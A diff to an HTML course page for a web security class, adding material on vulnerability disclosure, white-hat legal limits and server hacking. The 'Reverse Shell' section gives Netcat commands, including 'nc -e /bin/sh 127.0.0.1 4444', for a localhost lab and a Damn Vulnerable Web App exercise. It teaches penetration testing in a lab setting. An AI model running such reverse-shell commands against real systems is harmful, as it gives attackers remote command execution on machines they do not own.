@@ -88,7 +88,6 @@
             <li>Testing for Weak Cryptography</li>
             <li>Business Logic Testing</li>
             <li>Client Side Testing</li>
-            <li></li>
           </ul>
           <p>Areas we will cover in class:</p>
           <ul>
@@ -102,6 +101,102 @@
 
           <h1>Google's XSS Game</h1>
           <p>[XSS Game](https://xss-game.appspot.com/)</p>
+
+
+          <h1>Handling Vulnerabilities</h1>
+          <p>An important and often overlooked part of the maintenance process is having a system in place to report, manage,
+            and fix vulnerabilities. This includes handling vulnerabilities reported by third parties.</p>
+
+          <h2>How not to do it</h2>
+          <p>First let's look at how not to do it. These are some examples of terrible vulnerability disclosure and management
+            by companies you know.</p>
+          <p>[Paneral Bread Leaves User's Data Vulnerable for 8 Months](https://medium.com/@djhoulihan/no-panera-bread-doesnt-take-security-seriously-bf078027f815)</p>
+          <p>[Uber Concealed Massive Hack](https://www.theguardian.com/technology/2017/nov/21/uber-data-hack-cyber-attack)</p>
+
+          <h2>How to Handle Vulnerability Reporting</h2>
+          <p>The keys to properly managing vulnerability reports are the following:</p>
+          <h3>Have a Process</h3>
+          <p>If there is no process in place, it is easy for reported vulnerabilities to slip through the cracks and remain
+            unfixed. Who do the reports go to? Who will verify the issue? Who is responsible for fixing the vulnerability?
+            These are the questions your organization should have clear answers to.</p>
+          <h3>Have a Point of Contact</h3>
+          <p>Often the most challenging aspect for a user to report a vulnerability is finding an appropriate point of contact
+            in the organization. It is important to have clear and obvious contact information for reporting vulnerabilities.
+            Furthermore, it is important to follow up and acknowledge when a report has been received.</p>
+          <p>Additionally, add a [security.txt](https://securitytxt.org/) file to your website.</p>
+          <p>[Handling Security Reports](https://www.cio.com/article/3157698/security/how-to-handle-security-vulnerability-reports.html)</p>
+
+          <h2>Vulnerability Disclosure</h2>
+          <p>A responsible organization will disclose breaches to protect their user's data and interests. The following process
+            will help your be ready in the case of a breach.</p>
+          <p>[OWASP: Vulnerability Disclosure Cheat Sheet](https://www.owasp.org/index.php/Vulnerability_Disclosure_Cheat_Sheet)</p>
+          <p>[Data Breach Disclosure 101](https://www.troyhunt.com/data-breach-disclosure-101-how-to-succeed-after-youve-failed/)</p>
+          <h3>Prepare</h3>
+          <p>Determine the scope of security in your organization, have a process, and have a point of contact.</p>
+          <p>Have a [Disclosure Policy](https://www.hackerone.com/blog/Vulnerability-Disclosure-Policy-Basics-5-Critical-Components).</p>
+          <p>Here is a disclosure [Example](https://responsibledisclosure.nl/en/).</p>
+          <h3>Identity</h3>
+          <p>Document every step in the process of identifying, exploiting, and fixing a vulnerability.</p>
+          <p>[How to Write a Good Vulnerability Report](https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report)</p>
+          <h3>Report</h3>
+          <ul>
+            <li>Alert the company and appropriate persons within the organization</li>
+            <li>Request a CVE Identification if appropriate</li>
+            <li>Alert trusted 3rd party like National CERT, Data Privacy regulator, or security professionals</li>
+            <li>Full/public disclosure</li>
+          </ul>
+
+          <h2>Examples of Well-Handled Disclosure</h2>
+          <p>[Austrailian Red Cross](http://www.donateblood.com.au/media/news/blood-service-apologises-donor-data-leak)</p>
+          <p>[Other Examples](https://blog.cyberint.com/our-favorite-examples-of-how-ceos-respond-to-cyber-breaches)</p>
+
+          <h1>Server Hacking</h1>
+          <p>To wrap up our time together, let's dig in a little more into web server hacking. In particular, we will practice
+            acquiring shell access to a target machine.</p>
+          <p>[How I Hacked 40 Websites in 7 Minutes](https://hackernoon.com/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824)</p>
+
+          <h2>Reverse Shell</h2>
+          <p>via [Infosec Institute](http://resources.infosecinstitute.com/icmp-reverse-shell/): A reverse shell is a type of
+            shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener
+            port on which it receives the connection, allowing code or command execution to be achieved.</p>
+          <p>[Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)</p>
+          <p>[Simple Reverse Shells](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)</p>
+
+          <h3>Using Netcat to Create a Reverse Shell</h3>
+          <p>Here we will simulate creating and connecting to a Reverse Shell. In this case, we will be doing everything on
+            the same machine. In a real-world scenario, you would be connecting to a victim machine's shell.</p>
+          <p>Start a Kali Linux docker image.</p>
+          <script type='template/code'>docker run -t -i -p 4444:4444 kalilinux/kali-linux-docker /bin/bash</script>
+          <p>Make sure Netcat is installed.</p>
+          <script type='template/code'>apt-get install Netcat</script>
+          <p>Open a second terminal and connect to the Kali Linux container.</p>
+          <script type='template/code'>docker exec -it kali-linux-docker /bin/bash</script>
+          <p>In one of the terminals, use Netcat to listen for connections on port `4444`. This represents your local machine.</p>
+          <script type='template/code'>nc -lvp 4444</script>
+          <p>In the second terminal, establish a reverse shell connection to your local machine.</p>
+          <script type='template/code'>nc -e /bin/sh 127.0.0.1 4444</script>
+
+          <p>**Challenge:** Try using one of the methods in the [Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+            to establish your connection.</p>
+
+          <div class='outline'>
+            <h3>In-Class: Use the shell vulnerabilitiy in the Damn Vulnerable Web App to create a reverse shell connection between it and your Kali Linux instance.</h3>
+          </div>
+
+          <h1>White-hat Hacking</h1>
+          <p>**Most Important Rule:** Don't access or attack someone else's property without their express permission! It is
+            illegal!</p>
+          <p>Obviously, this makes reporting vulnerabilities a dubious proposition, especially if you've come accross them by
+            chance.
+          </p>
+          <p>[Penetration Testing by the Letter of the Law](https://www.securitymagazine.com/articles/88489-penetration-testing-by-letter-of-the-law)</p>
+          <p>[Legal Issues in Penetration Testing](https://securitycurrent.com/legal-issues-in-penetration-testing/)</p>
+
+          <h1>Industry Experts</h1>
+          <p>[Troy Hunt](https://www.troyhunt.com/)</p>
+          <p>[Have I Been Pwned](https://haveibeenpwned.com/)</p>
+          <p>[Brian Krebs](https://krebsonsecurity.com/)</p>
+          <p>[Top Security Blogs 2018](https://onlinedegrees.sandiego.edu/top-cyber-security-blogs-websites/)</p>
 
           <!-- End Col-->
         </div>
